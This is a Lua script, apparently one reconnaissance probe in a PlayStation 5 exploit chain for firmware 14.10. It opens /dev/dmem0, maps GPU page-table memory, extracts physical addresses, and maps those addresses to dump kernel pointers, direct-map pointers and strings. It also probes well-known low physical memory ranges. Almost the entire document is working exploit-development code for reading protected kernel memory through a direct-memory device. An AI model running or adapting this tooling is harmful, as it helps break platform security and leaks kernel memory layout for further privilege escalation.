-- 14.10 Recon Probe 18: Extract physical addresses from GPU page tables
-- and mmap dmem0 at those offsets to read kernel data structures
-- Probe 17 found dense data at dmem0 offset 0x10000-0x18000 with
-- values like 0x0000000200b60000 that look like physical addresses

local out = {}
local function log(s) out[#out+1] = s; print(s) end

log("=== 14.10 RECON: DMEM PHYS ADDR SCAN ===")
log("fw: " .. tostring(FW_VERSION))
log("pid: " .. syscall.getpid():tonumber())

syscall.resolve({
    sc_open = 5, sc_close = 6,
    sc_mmap = 477, sc_munmap = 73,
    sc_getpid = 20,
})

local dmem_fd = -1
local ok, ret = pcall(function() return syscall.sc_open("/dev/dmem0", 0):tonumber() end)
if ok and ret >= 0 then dmem_fd = ret end
log("dmem0 fd: " .. dmem_fd)

local PAGE = 0x4000
local PROT_READ = 1
local MAP_SHARED = 1

-- ============================================================
-- PART 1: Extract all address-like values from 0x10000-0x18000
-- ============================================================
log("")
log("--- PART 1: extract addresses from GPU tables ---")

local phys_addrs = {}
local seen = {}

for base_off = 0x10000, 0x17FFF, PAGE do
    local m_ok, m_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, base_off)
    end)
    if not m_ok then
        log(string.format("  off=0x%x: mmap failed", base_off))
    else
        local addr = m_ret:tonumber()
        if addr == 0 or addr == 0xFFFFFFFFFFFFFFFF then
            log(string.format("  off=0x%x: mmap returned invalid", base_off))
        else
            local page_nz = 0
            for i = 0, PAGE - 8, 8 do
                local lo = memory.read_dword(addr + i):tonumber()
                local hi = memory.read_dword(addr + i + 4):tonumber()
                local val_lo = lo
                local val_hi = hi

                if lo ~= 0 or hi ~= 0 then
                    page_nz = page_nz + 1

                    -- Physical addresses on PS5:
                    -- RAM: 0x000000000 - 0x3FFFFFFFF (16GB)
                    -- MMIO: 0x0000000xx_xxxxxxxx (device specific)
                    -- Look for values in plausible physical ranges
                    -- hi=0-3 with nonzero lo = plausible 16GB phys addr
                    -- Also page-aligned values (low 12 bits = 0)
                    if hi >= 0 and hi <= 4 and (lo ~= 0 or hi ~= 0) then
                        -- Reconstruct 64-bit value
                        -- Check if it looks page-aligned (low 12 bits zero)
                        local full_lo = lo
                        local is_aligned = (lo % 4096 == 0)
                        -- Must be > 0x1000 to not be null-ish
                        if (hi > 0 or lo > 0x10000) and hi <= 4 then
                            local key = string.format("%08x%08x", hi, lo)
                            if not seen[key] then
                                seen[key] = true
                                phys_addrs[#phys_addrs + 1] = {
                                    src_off = base_off + i,
                                    hi = hi, lo = lo,
                                    aligned = is_aligned
                                }
                            end
                        end
                    end
                end
            end
            log(string.format("  off=0x%x: %d nonzero qwords, %d new phys addrs",
                base_off, page_nz, #phys_addrs))
            pcall(function() syscall.sc_munmap(addr, PAGE) end)
        end
    end
end

log("")
log("total unique physical addresses found: " .. #phys_addrs)

-- Sort by address value
table.sort(phys_addrs, function(a, b)
    if a.hi ~= b.hi then return a.hi < b.hi end
    return a.lo < b.lo
end)

-- Print them all (capped at 60)
for i = 1, math.min(60, #phys_addrs) do
    local p = phys_addrs[i]
    log(string.format("  0x%08x%08x from +0x%05x %s",
        p.hi, p.lo, p.src_off, p.aligned and "ALIGNED" or ""))
end
if #phys_addrs > 60 then log("  ... (" .. #phys_addrs .. " total)") end

-- ============================================================
-- PART 2: mmap dmem0 at extracted physical addresses
-- If dmem0's mmap offset maps to physical memory, we can
-- read whatever is at those physical addresses
-- ============================================================
log("")
log("--- PART 2: mmap at physical offsets ---")

-- Pick the most interesting addresses: page-aligned, unique high bytes
local test_addrs = {}
local hi_seen = {}

-- First: all page-aligned addresses
for _, p in ipairs(phys_addrs) do
    if p.aligned and #test_addrs < 30 then
        local hkey = p.hi
        test_addrs[#test_addrs + 1] = p
    end
end

log("testing " .. #test_addrs .. " page-aligned addresses...")

for _, p in ipairs(test_addrs) do
    -- The mmap offset is a 64-bit value: hi*2^32 + lo
    -- Lua numbers are doubles, good up to 2^53
    local offset = p.hi * 4294967296 + p.lo

    local m_ok2, m_ret2 = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, offset)
    end)
    local mapped = 0
    if m_ok2 then mapped = m_ret2:tonumber() end

    if mapped ~= 0 and mapped ~= 0xFFFFFFFFFFFFFFFF then
        -- Read first 64 bytes
        local q = {}
        for j = 0, 56, 8 do
            local lo2 = memory.read_dword(mapped + j):tonumber()
            local hi2 = memory.read_dword(mapped + j + 4):tonumber()
            if lo2 ~= 0 or hi2 ~= 0 then
                q[#q + 1] = string.format("%08x%08x", hi2, lo2)
            end
        end

        -- Count kernel pointers in full page
        local kptrs = 0
        local dmap_ptrs = 0
        local nz = 0
        for j = 0, PAGE - 8, 8 do
            local lo2 = memory.read_dword(mapped + j):tonumber()
            local hi2 = memory.read_dword(mapped + j + 4):tonumber()
            if lo2 ~= 0 or hi2 ~= 0 then nz = nz + 1 end
            if hi2 >= 0xFFFFFFFF then kptrs = kptrs + 1 end
            if hi2 >= 0xFFFFF800 and hi2 < 0xFFFFFF00 then dmap_ptrs = dmap_ptrs + 1 end
        end

        -- Look for ASCII strings
        local str_count = 0
        local first_str = ""
        local cur = {}
        for j = 0, math.min(PAGE - 1, 2047) do
            local b = memory.read_byte(mapped + j):tonumber()
            if b >= 32 and b < 127 then
                cur[#cur + 1] = string.char(b)
            else
                if #cur >= 4 then
                    str_count = str_count + 1
                    if first_str == "" then first_str = table.concat(cur) end
                end
                cur = {}
            end
        end

        local tag = ""
        if kptrs > 0 then tag = tag .. " KPTRS:" .. kptrs end
        if dmap_ptrs > 0 then tag = tag .. " DMAP:" .. dmap_ptrs end
        if str_count > 0 then tag = tag .. " STR:" .. str_count end

        log(string.format("  phys=0x%08x%08x: MAPPED nz=%d%s",
            p.hi, p.lo, nz, tag))
        if #q > 0 then
            log("    first: " .. table.concat(q, " "):sub(1, 120))
        end
        if first_str ~= "" then
            log("    str: \"" .. first_str:sub(1, 60) .. "\"")
        end

        -- Deep dump if kernel pointers found
        if kptrs > 0 or dmap_ptrs > 0 then
            log("    === KERNEL DATA FOUND ===")
            for j = 0, PAGE - 8, 8 do
                local lo2 = memory.read_dword(mapped + j):tonumber()
                local hi2 = memory.read_dword(mapped + j + 4):tonumber()
                if hi2 >= 0xFFFFF000 then
                    local ktag = "KHIGH"
                    if hi2 >= 0xFFFFFFFF and lo2 >= 0x80000000 then
                        ktag = "KTEXT"
                    elseif hi2 >= 0xFFFFF800 and hi2 < 0xFFFFFF00 then
                        ktag = "DMAP"
                    end
                    log(string.format("      +%04x: 0x%08x%08x [%s]", j, hi2, lo2, ktag))
                end
            end
        end

        -- Deep dump if strings found (process names, driver names)
        if str_count > 2 then
            log("    strings:")
            cur = {}
            for j = 0, math.min(PAGE - 1, 4095) do
                local b = memory.read_byte(mapped + j):tonumber()
                if b >= 32 and b < 127 then
                    cur[#cur + 1] = string.char(b)
                else
                    if #cur >= 4 then
                        log("      +0x" .. string.format("%04x", j - #cur) ..
                            ": \"" .. table.concat(cur):sub(1, 80) .. "\"")
                    end
                    cur = {}
                end
            end
        end

        pcall(function() syscall.sc_munmap(mapped, PAGE) end)
    else
        -- Only log failures for interesting addresses
        if p.hi > 0 then
            log(string.format("  phys=0x%08x%08x: FAILED", p.hi, p.lo))
        end
    end
end

-- ============================================================
-- PART 3: Try well-known physical address ranges directly
-- On x86_64, low physical memory (<1MB) has BIOS/ACPI tables
-- Physical 0x1000-0x100000: real-mode IVT, BIOS data, ACPI
-- ============================================================
log("")
log("--- PART 3: well-known physical ranges ---")

local known_phys = {
    {0x0,        "phys 0 (null page)"},
    {0x1000,     "phys 0x1000 (real-mode IVT)"},
    {0x7C00,     "phys 0x7C00 (boot sector)"},
    {0x80000,    "phys 0x80000 (EBDA)"},
    {0xF0000,    "phys 0xF0000 (BIOS ROM shadow)"},
    {0x100000,   "phys 1MB (kernel load area)"},
    {0x200000,   "phys 2MB"},
    {0x1000000,  "phys 16MB"},
    {0x10000000, "phys 256MB"},
    {0x80000000, "phys 2GB"},
    {0x100000000, "phys 4GB"},
    {0x180000000, "phys 6GB"},
    {0x200000000, "phys 8GB"},
    {0x300000000, "phys 12GB"},
}

for _, spec in ipairs(known_phys) do
    local offset = spec[1]
    local label = spec[2]

    local m3_ok, m3_ret = pcall(function()
        return syscall.sc_mmap(0, PAGE, PROT_READ, MAP_SHARED, dmem_fd, offset)
    end)
    local a3 = 0
    if m3_ok then a3 = m3_ret:tonumber() end

    if a3 ~= 0 and a3 ~= 0xFFFFFFFFFFFFFFFF then
        local q0lo = memory.read_dword(a3):tonumber()
        local q0hi = memory.read_dword(a3 + 4):tonumber()

        -- Count content
        local nz3 = 0
        local kp3 = 0
        for j = 0, PAGE - 8, 64 do
            local lo3 = memory.read_dword(a3 + j):tonumber()
            local hi3 = memory.read_dword(a3 + j + 4):tonumber()
            if lo3 ~= 0 or hi3 ~= 0 then nz3 = nz3 + 1 end
            if hi3 >= 0xFFFF0000 then kp3 = kp3 + 1 end
        end

        local tag3 = ""
        if kp3 > 0 then tag3 = " KPTRS:" .. kp3 end

        log(string.format("  %-30s MAPPED nz=%d%s first=%08x%08x",
            label, nz3, tag3, q0hi, q0lo))

        -- If we find kernel pointers, dump them
        if kp3 > 0 then
            for j = 0, PAGE - 8, 8 do
                local lo3 = memory.read_dword(a3 + j):tonumber()
                local hi3 = memory.read_dword(a3 + j + 4):tonumber()
                if hi3 >= 0xFFFF0000 then
                    log(string.format("    +%04x: 0x%08x%08x", j, hi3, lo3))
                end
            end
        end

        -- Look for strings at BIOS/ACPI ranges
        if offset >= 0xF0000 and offset <= 0x100000 then
            local strs = {}
            cur = {}
            for j = 0, math.min(PAGE - 1, 4095) do
                local b3 = memory.read_byte(a3 + j):tonumber()
                if b3 >= 32 and b3 < 127 then
                    cur[#cur + 1] = string.char(b3)
                else
                    if #cur >= 4 then
                        strs[#strs + 1] = {off = j - #cur, s = table.concat(cur)}
                    end
                    cur = {}
                end
            end
            if #strs > 0 then
                for _, s in ipairs(strs) do
                    log("    +" .. string.format("%04x", s.off) ..
                        ": \"" .. s.s:sub(1, 60) .. "\"")
                end
            end
        end

        pcall(function() syscall.sc_munmap(a3, PAGE) end)
    else
        log(string.format("  %-30s FAILED", label))
    end
end

pcall(function() syscall.sc_close(dmem_fd) end)

log("")
log("=== DMEM PHYS SCAN DONE ===")
log("pid final: " .. syscall.getpid():tonumber())
return table.concat(out, "\n")
